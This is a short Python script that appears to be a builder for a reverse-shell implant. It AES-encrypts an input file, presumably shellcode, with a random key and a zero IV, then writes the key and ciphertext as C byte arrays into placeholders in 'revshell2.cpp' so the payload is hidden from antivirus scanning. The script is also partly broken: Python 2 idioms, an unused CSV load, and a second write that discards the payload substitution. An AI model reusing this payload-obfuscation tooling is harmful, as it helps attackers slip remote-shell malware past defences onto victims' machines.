import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib
import pandas as pd
data = pd.read_csv(sys.argv[1], encoding= 'unicode_escape')

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


plaintext = open(sys.argv[1], "r").read()

ciphertext = aesenc(plaintext, KEY)
key = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };'
payload = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'



f = open("revshell2.cpp", "r")

with open('revshell2.cpp', 'r') as file :
  filedata = file.read()

filedata = filedata.replace('payloadaes', payload)

with open('revshell2.cpp', 'w') as file:
  file.write(filedata)

f = open("revshell2.cpp", "r")

filedata = filedata.replace('KEYAES', key)

with open('revshell2.cpp', 'w') as file:
  file.write(filedata)
